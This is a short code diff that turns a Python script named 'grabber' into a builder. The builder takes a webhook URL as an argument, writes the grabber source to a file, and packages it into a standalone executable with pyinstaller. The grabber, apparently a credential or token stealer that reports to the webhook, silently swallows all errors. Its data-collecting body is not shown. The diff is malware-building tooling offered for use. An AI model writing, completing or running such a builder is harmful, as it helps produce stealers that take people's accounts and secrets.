@@ -1,3 +1,7 @@
+import os, sys
+WEBHOOK_URL = sys.argv[1]
+
+grabbercode = '''
 import os
 from re import findall
 from json import loads, dumps
@@ -153,3 +157,8 @@ try:
     main()
 except Exception:
     pass
+'''
+
+open('generatedgrabber.py', 'wb').write(bytes(grabbercode.encode('ascii')))
+
+os.system('pyinstaller --onefile -c -F generatedgrabber.py')
